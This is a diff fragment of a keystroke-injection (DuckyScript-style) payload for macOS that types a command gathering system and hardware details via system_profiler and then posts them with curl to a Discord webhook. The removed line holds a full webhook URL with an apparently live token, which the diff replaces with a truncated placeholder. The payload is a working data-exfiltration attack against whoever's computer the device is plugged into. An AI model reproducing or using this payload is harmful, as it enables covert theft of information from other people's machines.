@@ -13,7 +13,7 @@ STRING sys=$(system_profiler SPSoftwareDataType SPHardwareDataType)
 DELAY 750
 ENTER
 DELAY 500
-STRING curl -X POST -H "Content-Type: application/x-www-form-urlencoded" --data-urlencode "content=$sys" https://discord.com/api/webhooks/1296512673327878145/0h0RYRZEzKa3mIOsSYOJFLbRcxs5KUBhxP1oBbWdbKqbPgzKvENd8yKmyxALnTnpylOL
+STRING curl -X POST -H "Content-Type: application/x-www-form-urlencoded" --data-urlencode "content=$sys" https://webhook
 DELAY 1500
 ENTER
 DELAY 2000
